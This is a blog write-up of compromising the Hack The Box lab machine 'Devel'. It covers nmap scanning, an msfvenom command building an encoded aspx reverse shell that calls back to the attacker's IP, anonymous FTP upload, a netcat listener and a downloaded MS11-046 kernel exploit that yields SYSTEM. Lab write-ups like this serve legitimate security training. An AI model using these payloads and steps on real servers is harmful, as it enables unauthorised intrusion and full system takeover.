---
layout: post
title: Owning 'Devel' the manual/non-metasploit way.
---

01 January 2020

[@initinfosec](https://twitter.com/initinfosec)

## enumeration

### nmap

Initial scan shows port 21 and 80. FTP on 21 is open for anonymous logon.

```
╭─initinfosec@theMachine ~/writeups/HTB/devel/enumeration
╰─➤  sudo nmap -sS -sV -p- -O -oA devel 10.10.10.5                                1 ↵
Starting Nmap 7.80SVN ( https://nmap.org ) at 2019-12-30 16:05 CST
Nmap scan report for 10.10.10.5
Host is up (0.045s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.45 seconds

```
&nbsp;
## initial exploitation & user shell
&nbsp;
Since FTP appears to be open, I will see if I can upload a reverse shell file. Since IIS, I will try aspx first, if that does not work, then try asp or something else. Guessing on the arch here, if x86 fails out, i'll try x64. I'm sure there's a way to find the arch version via banner grab, something to look into later.

```
╭─initinfosec@theMachine ~/writeups/HTB/devel/enumeration
╰─➤  sudo msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.14.50 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
[sudo] password for initinfosec: 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of aspx file: 2874 bytes
Saved as: shell.aspx

```

upload to ftp server as follows:

```
╰─➤  ftp 10.10.10.5                               
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:initinfosec): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.

ftp> send
(local-file) /home/initinfosec/writeups/HTB/devel/enumeration/shell.aspx 
(remote-file) shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2911 bytes sent in 0.000225 seconds (12.3 Mbytes/s)

```

(could have used a one-liner send, but this works too)

open a listener with <code>nc -lnvp 4443</code>

and browse to <code>http://10.10.10.5/shell.aspx</code> in the browser and we get a shell!

```
╰─➤  sudo nc -nlvp 4443                                                   

[sudo] password for initinfosec: 
Connection from 10.10.10.5:49159
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
iis apppool\web

```

Upon trying to grab the user flag, looks like access is restricted. So we need to enumerate more and privesc.

&nbsp;
## The rocky road to privilege escalation & a system shell
&nbsp;

### further enumeration
running systeminfo reveals it ix indeed a x86 Windows 7 Enterprise box.

I suspect due to the seemingly sparse amount of installed applications that the privesc will be something system level, like a win32k kernerl exploit.

After awhile of searhcing, and failing to get a few powershell vulnerability/patch asessment scripts to work (e.g. Sherlock.ps1), I found and downloaded a script called WinPrivChecker.bat

That seems to bomb out on a lot. I also tried another priv checker, seemingly with mixed results. My remote shell seemed very limited on what you could do without it hanging at times, and Powershell was an older version (3), so I tried using a python script locally on Linux, that I passed the results of the cmd systeminfo output (for KBs)

```
╰─➤  python2 ./windows-exploit-suggester.py --database 2019-12-31-mssb.xls --systeminfo devel_sysinfo.txt


[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 179 potential bulletins(s) with a database of 137 known exploits
[*] there are now 179 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 32-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

```

From what I can gather, this seems to be a largely unpatched Win7 x86 box.

### exploitation to gain NT\_Authority\_System
&nbsp;
Using ftp again, and set in binary mode, I transferred a few executables for some of the win32 kernel exploits suggested in the results of above. 

I seemed to have mixed results with these, with most just killing or idling at the shell (IDK if they spawned another shell with NT\_Authority\_System or if they just killed the shell, but either way the prompt hung.)

For the sake of brevity, this writeup will not document the several hours I spent trying different exploits, only the 2 that seemed to be close to having the most success.

The first one I seemed to have some luck with was MS10-015. At first upon running, I got the following:

```
c:\inetpub\wwwroot>.\root.exe
.\root.exe
--------------------------------------------------
Windows NT/2K/XP/2K3/VISTA/2K8/7 NtVdmControl()->KiTrap0d local ring0 exploit
-------------------------------------------- taviso@sdf.lonestar.org ---

[+] Spawning a shell to give SYSTEM token (do not close it)
[?] CreateProcess("C:\WINDOWS\SYSTEM32\CMD.EXE") => 392
[?] GetVersionEx() => 6.1
[?] NtQuerySystemInformation() => \SystemRoot\system32\ntkrnlpa.exe@82843000
[?] Searching for kernel 6.1 signature { 64, a1, ... } ...
[+] Signature found 0xcde8d bytes from kernel base
[+] Starting the NTVDM subsystem by launching MS-DOS executable
[?] CreateProcess("C:\WINDOWS\SYSTEM32\DEBUG.EXE") => 0
[!] OpenProcess(0) failed, 0x57
[!] SpawnNTVDMAndGetUsefulAccess() returned failure
[+] Press any key to exit...
```

After reading through the source code for the exploit, I realized that error occured when missing the vdmexploit.dll library in the same folder as the exploit was ran. I realized I had the dll from the PoC i downloaded with wget, so transferred that over in binary over ftp. 

Upon doing that, it seems to have worked, however, SoP for the  exploit is to spawn a new privlidged cmd shell. Since I don't have a GUI, and only have one current shell, I can't see if anything spawned. 


```
c:\inetpub\wwwroot>.\root.exe
.\root.exe
--------------------------------------------------
Windows NT/2K/XP/2K3/VISTA/2K8/7 NtVdmControl()->KiTrap0d local ring0 exploit
-------------------------------------------- taviso@sdf.lonestar.org ---

[+] Spawning a shell to give SYSTEM token (do not close it)
[?] CreateProcess("C:\WINDOWS\SYSTEM32\CMD.EXE") => 3532
[?] GetVersionEx() => 6.1
[?] NtQuerySystemInformation() => \SystemRoot\system32\ntkrnlpa.exe@82843000
[?] Searching for kernel 6.1 signature { 64, a1, ... } ...
[+] Signature found 0xcde8d bytes from kernel base
[+] Starting the NTVDM subsystem by launching MS-DOS executable
[?] CreateProcess("C:\WINDOWS\SYSTEM32\DEBUG.EXE") => 3612
[?] OpenProcess(3612) => 0x2c
[?] Injecting the exploit thread into NTVDM subsystem @0x2c

[?] WriteProcessMemory(0x2c, 0x1040000, "VDMEXPLOIT.DLL", 14);
[?] WaitForSingleObject(0x38, INFINITE);
```

There may be a way to assume the PID 3612 to get the system shell, but I wasn't sure. The other option might be to modify the exploit to upgrade the current shell instead of spawning a new one, but i'm not even sure if that would work, and i'm not much of a dev.

### using MS11-046 to own system
&nbsp;
I decided to proceed with another win32 kernel exploit i found on this fantastic github repo: [GitHub - SecWiki/windows-kernel-exploits: windows-kernel-exploits Windows](https://github.com/SecWiki/windows-kernel-exploits)

I tried to pick one that looked like it would spawn a shell from the current prompt instead of a new window. After some (OK, much) trial and erorr, I ended up with MS11-046. 

I downloaded the exploit, and transferred it via ftp in binary mode once again:

```
wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS11-046/ms11-046.exe
```

It's important to note (and I found out the hard way, that FireFox (and probably chrome) seem to block or modify the downloads of malicious .exe's (found that out after trying to run several, hence the wget). 

Transfer the file:

```─➤  ftp 10.10.10.5       
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:initinfosec): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> bin
200 Type set to I.
ftp> send /home/initinfosec/writeups/HTB/devel/exploits/MS11-049/ms11-046.exe do_work.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
112815 bytes sent in 0.0874 seconds (1.23 Mbytes/s)
ftp> bye
221 Goodbye.


```

and run on the remote shell:

```
C:\inetpub\wwwroot>.\do_work.exe
.\do_work.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

Woo! finally we have system access! From here we can grab both the user flag (in babis desktop folder) and the root flag (in the Adminstrator dekstop folder.)

Thanks for hanging in there! Hope you found this useful.
&nbsp;
&nbsp;

&nbsp;
### Afterword
&nbsp;
*N.B. --* It's of some interest to note that the official walkthrough and the IppSec video make use of the metasploit exploit suggester module. After being unsure of how to privesc, I initially tried this, and It recommended MS10-015. If you were to run this using the metasploit module (which I tried initially, it does catch the system shell. So presumably there is some logic in the .rb exploit to grab the secondary shell that spawns into the current session. So perhaps re-working the exploit to work in a single shell manually would be possible.) 
&nbsp;
Since I was trying to use this for PWK prep, I decided to go back and do the manual method, which for me, involved a lot of guess and check.
&nbsp;
If anyone has more information on how MS10-015 behaves, and how you could potentially leverage MS10-015 in a single shell session, or how meterpreter/metasploit handles this exploit (at a high level, i'm not a l337 guru :)), I'd love to hear. You can reach out to me at @initinfosec on twitter or initinfosec@protonmail.com 
